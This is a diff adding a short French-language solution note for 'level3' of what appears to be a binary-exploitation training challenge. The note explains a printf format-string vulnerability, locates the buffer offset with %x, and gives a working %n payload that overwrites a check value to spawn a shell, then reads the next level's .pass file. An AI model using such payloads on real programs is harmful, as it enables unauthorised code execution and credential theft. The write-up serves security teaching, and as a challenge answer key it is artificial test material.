@@ -1,0 +1,24 @@
+# Apres observation de l'asm, on voit que le programme fait un fget de 512, donc pas d'overflow possible.
+# Cependant le retour du fget est directement envoye a printf, ce qui est exploitable.
+# On sait que printf va chercher ces arguments sur la stack, donc il suffit de faire des %x pour afficher la stack.
+
+# Ressource: http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf
+
+# On commence par chercher a qu'elle index de la stack est stocke le buffer du fget.
+./level3
+> 0000 %x %x %x %x %x
+
+>> 0000 200 b7fd1ac0 b7ff37d0 30303030 20782520 <<
+
+# Donc 4 (30303030), il faudra faire 3 %x pour etre sur l'offset de notre buffer.
+
+# On voit dans le code que $eax recupere une valeur d'une adresse et le compare a 0x40 donc 64, si c'est bien 64 il appel un shell.
+# On va donc remplire a cette adresse, la valeur 0x40 grace a %n.
+
+python -c "print('\x8c\x98\x04\x08' + '%x' * 3 + 'A' * 41 + '%n')" > /tmp/file
+
+# On commence par l'adresse cible en little endiant, puis les 3 %x pour etre sur le buffer, on remplie avec ds caracteres pour arriver a 63 puis on rajoute le %n.
+# Le printf va recuperer l'adresse qu'on lui a donne comme parametre du buffer et donc y ecrire le nombre voulu.
+
+cat /tmp/file - | ./level3
+> cat /home/user/level4/.pass
